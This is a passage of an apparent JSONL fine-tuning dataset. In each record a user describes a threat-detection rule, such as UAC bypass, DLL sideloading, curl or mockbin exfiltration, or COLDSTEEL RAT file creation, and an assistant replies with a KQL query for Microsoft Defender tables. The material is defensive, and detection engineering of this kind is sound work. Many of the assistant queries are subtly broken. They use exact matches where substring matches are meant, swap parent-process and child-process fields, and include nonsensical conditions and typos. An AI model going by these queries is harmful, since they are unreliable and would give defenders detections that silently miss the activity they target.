\"\\\\fwpuclnt.dll\" or FolderPath endswith \"\\\\fxsapi.dll\" or FolderPath endswith \"\\\\fxsst.dll\" or FolderPath endswith \"\\\\fxstiff.dll\" or FolderPath endswith \"\\\\getuname.dll\" or FolderPath endswith \"\\\\gpapi.dll\" or FolderPath endswith \"\\\\hid.dll\" or FolderPath endswith \"\\\\hnetmon.dll\" or FolderPath endswith \"\\\\httpapi.dll\" or FolderPath endswith \"\\\\icmp.dll\" or FolderPath endswith \"\\\\idstore.dll\" or FolderPath endswith \"\\\\ieadvpack.dll\" or FolderPath endswith \"\\\\iedkcs32.dll\" or FolderPath endswith \"\\\\iernonce.dll\" or FolderPath endswith \"\\\\iertutil.dll\" or FolderPath endswith \"\\\\ifmon.dll\" or FolderPath endswith \"\\\\ifsutil.dll\" or FolderPath endswith \"\\\\inproclogger.dll\" or FolderPath endswith \"\\\\iphlpapi.dll\" or FolderPath endswith \"\\\\iri.dll\" or FolderPath endswith \"\\\\iscsidsc.dll\" or FolderPath endswith \"\\\\iscsium.dll\" or FolderPath endswith \"\\\\isv.exe_rsaenh.dll\" or FolderPath endswith \"\\\\iumbase.dll\" or FolderPath endswith \"\\\\iumsdk.dll\" or FolderPath endswith \"\\\\joinutil.dll\" or FolderPath endswith \"\\\\kdstub.dll\" or FolderPath endswith \"\\\\ksuser.dll\" or FolderPath endswith \"\\\\ktmw32.dll\" or FolderPath endswith \"\\\\licensemanagerapi.dll\" or FolderPath endswith \"\\\\licensingdiagspp.dll\" or FolderPath endswith \"\\\\linkinfo.dll\" or FolderPath endswith \"\\\\loadperf.dll\" or FolderPath endswith \"\\\\lockhostingframework.dll\" or FolderPath endswith \"\\\\logoncli.dll\" or FolderPath endswith \"\\\\logoncontroller.dll\" or FolderPath endswith \"\\\\lpksetupproxyserv.dll\" or FolderPath endswith \"\\\\lrwizdll.dll\" or FolderPath endswith \"\\\\magnification.dll\" or FolderPath endswith \"\\\\maintenanceui.dll\" or FolderPath endswith \"\\\\mapistub.dll\" or FolderPath endswith \"\\\\mbaexmlparser.dll\" or FolderPath endswith \"\\\\mdmdiagnostics.dll\" or FolderPath endswith \"\\\\mfc42u.dll\" or FolderPath endswith \"\\\\mfcore.dll\" or FolderPath endswith \"\\\\mfplat.dll\" or FolderPath endswith \"\\\\mi.dll\" or FolderPath endswith \"\\\\midimap.dll\" or FolderPath endswith \"\\\\mintdh.dll\" or FolderPath endswith \"\\\\miutils.dll\" or FolderPath endswith \"\\\\mlang.dll\" or FolderPath endswith \"\\\\mmdevapi.dll\" or FolderPath endswith \"\\\\mobilenetworking.dll\" or FolderPath endswith \"\\\\mpr.dll\" or FolderPath endswith \"\\\\mprapi.dll\" or FolderPath endswith \"\\\\mrmcorer.dll\" or FolderPath endswith \"\\\\msacm32.dll\" or FolderPath endswith \"\\\\mscms.dll\" or FolderPath endswith \"\\\\mscoree.dll\" or FolderPath endswith \"\\\\msctf.dll\" or FolderPath endswith \"\\\\msctfmonitor.dll\" or FolderPath endswith \"\\\\msdrm.dll\" or FolderPath endswith \"\\\\msdtctm.dll\" or FolderPath endswith \"\\\\msftedit.dll\" or FolderPath endswith \"\\\\msi.dll\" or FolderPath endswith \"\\\\msiso.dll\" or FolderPath endswith \"\\\\msutb.dll\" or FolderPath endswith \"\\\\msvcp110_win.dll\" or FolderPath endswith \"\\\\mswb7.dll\" or FolderPath endswith \"\\\\mswsock.dll\" or FolderPath endswith \"\\\\msxml3.dll\" or FolderPath endswith \"\\\\mtxclu.dll\" or FolderPath endswith \"\\\\napinsp.dll\" or FolderPath endswith \"\\\\ncrypt.dll\" or FolderPath endswith \"\\\\ndfapi.dll\" or FolderPath endswith \"\\\\netapi32.dll\" or FolderPath endswith \"\\\\netid.dll\" or FolderPath endswith \"\\\\netiohlp.dll\" or FolderPath endswith \"\\\\netjoin.dll\" or FolderPath endswith \"\\\\netplwiz.dll\" or FolderPath endswith \"\\\\netprofm.dll\" or FolderPath endswith \"\\\\netprovfw.dll\" or FolderPath endswith \"\\\\netsetupapi.dll\" or FolderPath endswith \"\\\\netshell.dll\" or FolderPath endswith \"\\\\nettrace.dll\" or FolderPath endswith \"\\\\netutils.dll\" or FolderPath endswith \"\\\\networkexplorer.dll\" or FolderPath endswith \"\\\\newdev.dll\" or FolderPath endswith \"\\\\ninput.dll\" or FolderPath endswith \"\\\\nlaapi.dll\" or FolderPath endswith \"\\\\nlansp_c.dll\" or FolderPath endswith \"\\\\npmproxy.dll\" or FolderPath endswith \"\\\\nshhttp.dll\" or FolderPath endswith \"\\\\nshipsec.dll\" or FolderPath endswith \"\\\\nshwfp.dll\" or FolderPath endswith \"\\\\ntdsapi.dll\" or FolderPath endswith \"\\\\ntlanman.dll\" or FolderPath endswith \"\\\\ntlmshared.dll\" or FolderPath endswith \"\\\\ntmarta.dll\" or FolderPath endswith \"\\\\ntshrui.dll\" or FolderPath endswith \"\\\\oleacc.dll\" or FolderPath endswith \"\\\\omadmapi.dll\" or FolderPath endswith \"\\\\onex.dll\" or FolderPath endswith \"\\\\opcservices.dll\" or FolderPath endswith \"\\\\osbaseln.dll\" or FolderPath endswith \"\\\\osksupport.dll\" or FolderPath endswith \"\\\\osuninst.dll\" or FolderPath endswith \"\\\\p2p.dll\" or FolderPath endswith \"\\\\p2pnetsh.dll\" or FolderPath endswith \"\\\\p9np.dll\" or FolderPath endswith \"\\\\pcaui.dll\" or FolderPath endswith \"\\\\pdh.dll\" or FolderPath endswith \"\\\\peerdistsh.dll\" or FolderPath endswith \"\\\\pkeyhelper.dll\" or FolderPath endswith \"\\\\pla.dll\" or FolderPath endswith \"\\\\playsndsrv.dll\" or FolderPath endswith \"\\\\pnrpnsp.dll\" or FolderPath endswith \"\\\\policymanager.dll\" or FolderPath endswith \"\\\\polstore.dll\" or FolderPath endswith \"\\\\powrprof.dll\" or FolderPath endswith \"\\\\printui.dll\" or FolderPath endswith \"\\\\prntvpt.dll\" or FolderPath endswith \"\\\\profapi.dll\" or FolderPath endswith \"\\\\propsys.dll\" or FolderPath endswith \"\\\\proximitycommon.dll\" or FolderPath endswith \"\\\\proximityservicepal.dll\" or FolderPath endswith \"\\\\prvdmofcomp.dll\" or FolderPath endswith \"\\\\puiapi.dll\" or FolderPath endswith \"\\\\radcui.dll\" or FolderPath endswith \"\\\\rasapi32.dll\" or FolderPath endswith \"\\\\rasdlg.dll\" or FolderPath endswith \"\\\\rasgcw.dll\" or FolderPath endswith \"\\\\rasman.dll\" or FolderPath endswith \"\\\\rasmontr.dll\" or FolderPath endswith \"\\\\reagent.dll\" or FolderPath endswith \"\\\\regapi.dll\" or FolderPath endswith \"\\\\reseteng.dll\" or FolderPath endswith \"\\\\resetengine.dll\" or FolderPath endswith \"\\\\resutils.dll\" or FolderPath endswith \"\\\\rmclient.dll\" or FolderPath endswith \"\\\\rpcnsh.dll\" or FolderPath endswith \"\\\\rsaenh.dll\" or FolderPath endswith \"\\\\rtutils.dll\" or FolderPath endswith \"\\\\rtworkq.dll\" or FolderPath endswith \"\\\\samcli.dll\" or FolderPath endswith \"\\\\samlib.dll\" or FolderPath endswith \"\\\\sapi_onecore.dll\" or FolderPath endswith \"\\\\sas.dll\" or FolderPath endswith \"\\\\scansetting.dll\" or FolderPath endswith \"\\\\scecli.dll\" or FolderPath endswith \"\\\\schedcli.dll\" or FolderPath endswith \"\\\\secur32.dll\" or FolderPath endswith \"\\\\security.dll\" or FolderPath endswith \"\\\\sensapi.dll\" or FolderPath endswith \"\\\\shell32.dll\" or FolderPath endswith \"\\\\shfolder.dll\" or FolderPath endswith \"\\\\slc.dll\" or FolderPath endswith \"\\\\snmpapi.dll\" or FolderPath endswith \"\\\\spectrumsyncclient.dll\" or FolderPath endswith \"\\\\spp.dll\" or FolderPath endswith \"\\\\sppc.dll\" or FolderPath endswith \"\\\\sppcext.dll\" or FolderPath endswith \"\\\\srclient.dll\" or FolderPath endswith \"\\\\srcore.dll\" or FolderPath endswith \"\\\\srmtrace.dll\" or FolderPath endswith \"\\\\srpapi.dll\" or FolderPath endswith \"\\\\srvcli.dll\" or FolderPath endswith \"\\\\ssp_isv.exe_rsaenh.dll\" or FolderPath endswith \"\\\\ssp.exe_rsaenh.dll\" or FolderPath endswith \"\\\\sspicli.dll\" or FolderPath endswith \"\\\\ssshim.dll\" or FolderPath endswith \"\\\\staterepository.core.dll\" or FolderPath endswith \"\\\\structuredquery.dll\" or FolderPath endswith \"\\\\sxshared.dll\" or FolderPath endswith \"\\\\systemsettingsthresholdadminflowui.dll\" or FolderPath endswith \"\\\\tapi32.dll\" or FolderPath endswith \"\\\\tbs.dll\" or FolderPath endswith \"\\\\tdh.dll\" or FolderPath endswith \"\\\\textshaping.dll\" or FolderPath endswith \"\\\\timesync.dll\" or FolderPath endswith \"\\\\tpmcoreprovisioning.dll\" or FolderPath endswith \"\\\\tquery.dll\" or FolderPath endswith \"\\\\tsworkspace.dll\" or FolderPath endswith \"\\\\ttdrecord.dll\" or FolderPath endswith \"\\\\twext.dll\" or FolderPath endswith \"\\\\twinapi.dll\" or FolderPath endswith \"\\\\twinui.appcore.dll\" or FolderPath endswith \"\\\\uianimation.dll\" or FolderPath endswith \"\\\\uiautomationcore.dll\" or FolderPath endswith \"\\\\uireng.dll\" or FolderPath endswith \"\\\\uiribbon.dll\" or FolderPath endswith \"\\\\umpdc.dll\" or FolderPath endswith \"\\\\unattend.dll\" or FolderPath endswith \"\\\\updatepolicy.dll\" or FolderPath endswith \"\\\\upshared.dll\" or FolderPath endswith \"\\\\urlmon.dll\" or FolderPath endswith \"\\\\userenv.dll\" or FolderPath endswith \"\\\\utildll.dll\" or FolderPath endswith \"\\\\uxinit.dll\" or FolderPath endswith \"\\\\uxtheme.dll\" or FolderPath endswith \"\\\\vaultcli.dll\" or FolderPath endswith \"\\\\vdsutil.dll\" or FolderPath endswith \"\\\\version.dll\" or FolderPath endswith \"\\\\virtdisk.dll\" or FolderPath endswith \"\\\\vssapi.dll\" or FolderPath endswith \"\\\\vsstrace.dll\" or FolderPath endswith \"\\\\wbemprox.dll\" or FolderPath endswith \"\\\\wbemsvc.dll\" or FolderPath endswith \"\\\\wcmapi.dll\" or FolderPath endswith \"\\\\wcnnetsh.dll\" or FolderPath endswith \"\\\\wdi.dll\" or FolderPath endswith \"\\\\wdscore.dll\" or FolderPath endswith \"\\\\webservices.dll\" or FolderPath endswith \"\\\\wecapi.dll\" or FolderPath endswith \"\\\\wer.dll\" or FolderPath endswith \"\\\\wevtapi.dll\" or FolderPath endswith \"\\\\whhelper.dll\" or FolderPath endswith \"\\\\wimgapi.dll\" or FolderPath endswith \"\\\\winbio.dll\" or FolderPath endswith \"\\\\winbrand.dll\" or FolderPath endswith \"\\\\windows.storage.dll\" or FolderPath endswith \"\\\\windows.storage.search.dll\" or FolderPath endswith \"\\\\windows.ui.immersive.dll\" or FolderPath endswith \"\\\\windowscodecs.dll\" or FolderPath endswith \"\\\\windowscodecsext.dll\" or FolderPath endswith \"\\\\windowsudk.shellcommon.dll\" or FolderPath endswith \"\\\\winhttp.dll\" or FolderPath endswith \"\\\\wininet.dll\" or FolderPath endswith \"\\\\winipsec.dll\" or FolderPath endswith \"\\\\winmde.dll\" or FolderPath endswith \"\\\\winmm.dll\" or FolderPath endswith \"\\\\winnsi.dll\" or FolderPath endswith \"\\\\winrnr.dll\" or FolderPath endswith \"\\\\winscard.dll\" or FolderPath endswith \"\\\\winsqlite3.dll\" or FolderPath endswith \"\\\\winsta.dll\" or FolderPath endswith \"\\\\winsync.dll\" or FolderPath endswith \"\\\\wkscli.dll\" or FolderPath endswith \"\\\\wlanapi.dll\" or FolderPath endswith \"\\\\wlancfg.dll\" or FolderPath endswith \"\\\\wldp.dll\" or FolderPath endswith \"\\\\wlidprov.dll\" or FolderPath endswith \"\\\\wmiclnt.dll\" or FolderPath endswith \"\\\\wmidcom.dll\" or FolderPath endswith \"\\\\wmiutils.dll\" or FolderPath endswith \"\\\\wmpdui.dll\" or FolderPath endswith \"\\\\wmsgapi.dll\" or FolderPath endswith \"\\\\wofutil.dll\" or FolderPath endswith \"\\\\wpdshext.dll\" or FolderPath endswith \"\\\\wscapi.dll\" or FolderPath endswith \"\\\\wsdapi.dll\" or FolderPath endswith \"\\\\wshbth.dll\" or FolderPath endswith \"\\\\wshelper.dll\" or FolderPath endswith \"\\\\wsmsvc.dll\" or FolderPath endswith \"\\\\wtsapi32.dll\" or FolderPath endswith \"\\\\wwancfg.dll\" or FolderPath endswith \"\\\\wwapi.dll\" or FolderPath endswith \"\\\\xmllite.dll\" or FolderPath endswith \"\\\\xolehlp.dll\" or FolderPath endswith \"\\\\xpsservices.dll\" or FolderPath endswith \"\\\\xwizards.dll\" or FolderPath endswith \"\\\\xwtpw32.dll\" or FolderPath endswith \"\\\\amsi.dll\" or FolderPath endswith \"\\\\appraiser.dll\" or FolderPath endswith \"\\\\COMRES.DLL\" or FolderPath endswith \"\\\\cryptnet.dll\" or FolderPath endswith \"\\\\DispBroker.dll\" or FolderPath endswith \"\\\\dsound.dll\" or FolderPath endswith \"\\\\dxilconv.dll\" or FolderPath endswith \"\\\\FxsCompose.dll\" or FolderPath endswith \"\\\\FXSRESM.DLL\" or FolderPath endswith \"\\\\msdtcVSp1res.dll\" or FolderPath endswith \"\\\\PrintIsolationProxy.dll\" or FolderPath endswith \"\\\\rdpendp.dll\" or FolderPath endswith \"\\\\rpchttp.dll\" or FolderPath endswith \"\\\\storageusage.dll\" or FolderPath endswith \"\\\\utcutil.dll\" or FolderPath endswith \"\\\\WfsR.dll\" or FolderPath endswith \"\\\\igd10iumd64.dll\" or FolderPath endswith \"\\\\igd12umd64.dll\" or FolderPath endswith \"\\\\igdumdim64.dll\" or FolderPath endswith \"\\\\igdusc64.dll\" or FolderPath endswith \"\\\\TSMSISrv.dll\" or FolderPath endswith \"\\\\TSVIPSrv.dll\" or FolderPath endswith \"\\\\wbemcomn.dll\" or FolderPath endswith \"\\\\WLBSCTRL.dll\" or FolderPath endswith \"\\\\wow64log.dll\" or FolderPath endswith \"\\\\WptsExtensions.dll\") and (not(((FolderPath endswith \"\\\\version.dll\" and FolderPath startswith \"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\\") or (FolderPath endswith \"\\\\d3dx9_43.dll\" and FolderPath startswith \"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.DirectXRuntime_\") or (FolderPath endswith \"\\\\cscui.dll\" and FolderPath startswith \"C:\\\\Windows\\\\Microsoft.NET\\\\\") or (FolderPath contains \"C:\\\\$WINDOWS.~BT\\\\\" or FolderPath contains \"C:\\\\$WinREAgent\\\\\" or FolderPath contains \"C:\\\\Windows\\\\SoftwareDistribution\\\\\" or FolderPath contains \"C:\\\\Windows\\\\System32\\\\\" or FolderPath contains \"C:\\\\Windows\\\\SystemTemp\\\\\" or FolderPath contains \"C:\\\\Windows\\\\SysWOW64\\\\\" or FolderPath contains \"C:\\\\Windows\\\\WinSxS\\\\\")))) and (not((((FolderPath endswith \"\\\\mi.dll\" or FolderPath endswith \"\\\\miutils.dl\") and FolderPath startswith \"C:\\\\Program Files\\\\Arsenal-Image-Mounter-\") or FolderPath startswith \"C:\\\\Packages\\\\Plugins\\\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\\\" or (FolderPath endswith \"\\\\PolicyManager.dll\" and (FolderPath startswith \"C:\\\\Program Files\\\\CheckPoint\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\CheckPoint\\\\\") and InitiatingProcessFolderPath =~ \"\\\\SmartConsole.exe\") or (FolderPath startswith \"C:\\\\Program Files\\\\WindowsApps\\\\DellInc.DellSupportAssistforPCs\" and (InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\WindowsApps\\\\DellInc.DellSupportAssistforPCs\" or InitiatingProcessFolderPath contains \"C:\\\\Windows\\\\System32\\\\backgroundTaskHost.exe\")) or InitiatingProcessFolderPath =~ \"\\\\wldp.dll\" or (FolderPath endswith \"\\\\mswb7.dll\" and FolderPath startswith \"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\\") or (InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\Common Files\\\\microsoft shared\\\\ClickToRun\\\\OfficeClickToRun.exe\" and FolderPath =~ \"C:\\\\Program Files\\\\Common Files\\\\microsoft shared\\\\ClickToRun\\\\AppVPolicy.dll\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22) Topic: proc_creation_win_uac_bypass_consent_comctl32"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\consent.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\")) and InitiatingProcessFolderPath =~ \"\\\\werfault.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects whether the image specified in a process creation event doesnt refer to an \".exe\" (or other known executable extension) file. This can be caused by process ghosting or other unorthodox methods to start a process.\nThis rule might require some initial baselining to align with some third party tooling in the user environment.\n Topic: proc_creation_win_susp_non_exe_image"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (not((InitiatingProcessFolderPath in~ (\".bin\", \".cgi\", \".com\", \".exe\", \".scr\", \".tmp\")))) and (not((FolderPath contains \":\\\\$Extend\\\\$Deleted\\\\\" or FolderPath contains \":\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\\" or (FolderPath in~ (\"-\", \"\")) or (FolderPath in~ (\"System\", \"Registry\", \"MemCompression\", \"vmmem\")) or FolderPath contains \":\\\\Windows\\\\Installer\\\\MSI\" or (FolderPath contains \":\\\\Config.Msi\\\\\" and (InitiatingProcessFolderPath in~ (\".rbf\", \".rbs\"))) or isnull(FolderPath) or (InitiatingProcessFolderPath contains \":\\\\Windows\\\\Temp\\\\\" or FolderPath contains \":\\\\Windows\\\\Temp\\\\\")))) and (not((InitiatingProcessFileName =~ \":\\\\ProgramData\\\\Avira\\\\\" or (InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\services.exe\" and InitiatingProcessFolderPath =~ \"com.docker.service\") or FolderPath contains \":\\\\Program Files\\\\Mozilla Firefox\\\\\" or InitiatingProcessFolderPath =~ \"\\\\LZMA_EXE\" or (InitiatingProcessFolderPath in~ (\":\\\\Program Files (x86)\\\\MyQ\\\\Server\\\\pcltool.dll\", \":\\\\Program Files\\\\MyQ\\\\Server\\\\pcltool.dll\")) or (FolderPath contains \"NVIDIA\\\\NvBackend\\\\\" and InitiatingProcessFolderPath =~ \".dat\") or ((FolderPath contains \":\\\\Program Files (x86)\\\\WINPAKPRO\\\\\" or FolderPath contains \":\\\\Program Files\\\\WINPAKPRO\\\\\") and InitiatingProcessFolderPath =~ \".ngn\") or (FolderPath contains \"\\\\AppData\\\\Local\\\\Packages\\\\\" and FolderPath contains \"\\\\LocalState\\\\rootfs\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification addition to the TypedPaths key in the user or admin registry from a non standard application. Which might indicate persistence attempt Topic: registry_set_persistence_typed_paths"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\TypedPaths*\" and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\explorer.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Aversaries may use to interact with a remote network share using Server Message Block (SMB).\nThis technique is used by post-exploitation frameworks.\n Topic: file_event_win_writing_local_admin_share"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\\\\\127.0.0\", \"\\\\ADMIN$\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential persistence activity via the registering of a new custom protocole handlers. While legitimate applications register protocole handlers often times during installation. And attacker can abuse this by setting a custom handler to be used as a persistence mechanism. Topic: registry_set_persistence_custom_protocol_handler"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryValueData startswith \"URL:\" and RegistryKey =~ \"HKEY_LOCAL_MACHINE\\\\CLASSES*\") and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\", \"C:\\\\Program Files\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")) or RegistryValueData startswith \"URL:ms-\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of a registry inside the \"\\Shell\\Open\\Command\" value with PowerShell classes from the \"System.Security.Cryptography\" namespace.\nThe PowerShell namespace \"System.Security.Cryptography\" provides classes for on-the-fly encryption and decryption.\nThese can be used for example in decrypting malicious payload for defense evasion.\n Topic: registry_set_powershell_crypto_namespace"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"RegistryValueSet\" and RegistryKey contains \"\\\\Shell\\\\Open\\\\Command\") and (RegistryValueData contains \"powershell\" or RegistryValueData contains \"pwsh\") and RegistryValueData contains \"System.Security.Cryptography.\" and (RegistryValueData contains \".AesCryptoServiceProvider\" or RegistryValueData contains \".DESCryptoServiceProvider\" or RegistryValueData contains \".DSACryptoServiceProvider\" or RegistryValueData contains \".RC2CryptoServiceProvider\" or RegistryValueData contains \".Rijndael\" or RegistryValueData contains \".RSACryptoServiceProvider\" or RegistryValueData contains \".TripleDESCryptoServiceProvider\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects commandline arguments for executing a child process via dotnet-trace.exe Topic: proc_creation_win_dotnet_trace_lolbin_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-- \", \"collect\")) and (FolderPath endswith \"\\\\dotnet-trace.exe\" or ProcessVersionInfoOriginalFileName =~ \"dotnet-trace.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"curl.exe\" with a potential custom \"User-Agent\". Attackers can leverage this to download or exfiltrate data via \"curl\" to a domain that only accept specific \"User-Agent\" strings Topic: proc_creation_win_curl_custom_user_agent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine matches regex \"\\\\s-H\\\\s\" and ProcessCommandLine =~ \"User-Agent:\") and (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoOriginalFileName =~ \"curl.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the expansion or decompression of cabinet files from potentially suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks Topic: proc_creation_win_expand_cabinet_files"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"-F:\" or ProcessCommandLine contains \"/F:\" or ProcessCommandLine contains \"\u2013F:\" or ProcessCommandLine contains \"\u2014F:\" or ProcessCommandLine contains \"\u2015F:\") and InitiatingProcessFolderPath =~ \"\\\\expand.exe\") and ((ProcessCommandLine in~ (\":\\\\Perflogs\\\\\", \":\\\\ProgramData\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\Admin$\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\", \"\\\\C$\\\\\", \"\\\\Temporary Internet\")) or ((ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favorites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Favourites\\\\\") or (ProcessCommandLine contains \":\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Contacts\\\\\"))) and (not((InitiatingProcessFileName =~ \"C:\\\\Program Files (x86)\\\\Dell\\\\UpdateService\\\\ServiceShell.exe\" and ProcessCommandLine =~ \"C:\\\\ProgramData\\\\Dell\\\\UpdateService\\\\Temp\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a Chromium based browser process with the \"headless\" flag and a URL pointing to the mockbin.org service (which can be used to exfiltrate data). Topic: proc_creation_win_browsers_chromium_mockbin_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"--headless\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\vivaldi.exe\")) and (ProcessCommandLine in~ (\"://run.mocky\", \"://mockbin\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file in a specific location and with a specific name related to COLDSTEEL RAT Topic: file_event_win_malware_coldsteel_service_dll_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Roaming\\\\newdev.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon or suspicious child processes spawning from a WSL process. This could indicate an attempt to evade parent/child relationship detections or persistence attempts via cron using WSL Topic: proc_creation_win_wsl_child_processes_anomalies"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\wsl.exe\", \"\\\\wslhost.exe\")) and ((InitiatingProcessFolderPath in~ (\"\\\\calc.exe\", \"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\wscript.exe\")) or (FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or FolderPath contains \"C:\\\\Users\\\\Public\\\\\" or FolderPath contains \"C:\\\\Windows\\\\Temp\\\\\" or FolderPath contains \"C:\\\\Temp\\\\\" or FolderPath contains \"\\\\Downloads\\\\\" or FolderPath contains \"\\\\Desktop\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification Topic: registry_set_bypass_uac_using_eventviewer"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"_Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\(Default)\" and (not(RegistryValueData startswith \"%SystemRoot%\\\\system32\\\\mmc.exe \\\"%1\\\" %\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759 Topic: proc_creation_win_exploit_cve_2017_8759"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\WINWORD.EXE\" and InitiatingProcessFolderPath =~ \"\\\\csc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the initial execution of \"cmd.exe\" which spawns \"explorer.exe\" with the appropriate command line arguments for opening the \"My Computer\" folder.\n Topic: proc_creation_win_explorer_folder_shortcut_via_shell_binary"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and ProcessCommandLine =~ \"shell:mycomputerfolder\" and InitiatingProcessFolderPath =~ \"\\\\explorer.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"whoami.exe\" with the \"/FO\" flag to choose CSV as output format or with redirection options to export the results to a file for later use. Topic: proc_creation_win_whoami_output"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" /FO CSV\", \" -FO CSV\")) and (FolderPath endswith \"\\\\whoami.exe\" or ProcessVersionInfoOriginalFileName =~ \"whoami.exe\")) or ProcessCommandLine =~ \"whoami*>\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of a signed dbghelp.dll by the Sysinternals VMMap. Topic: image_load_side_load_vmmap_dbghelp_signed"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath contains \"C:\\\\Debuggers\\\\dbghelp.dll\" and InitiatingProcessVersionInfoCompanyName =~ \"true\" and (InitiatingProcessFolderPath in~ (\"\\\\vmmap.exe\", \"\\\\vmmap64.exe\"))"}]}
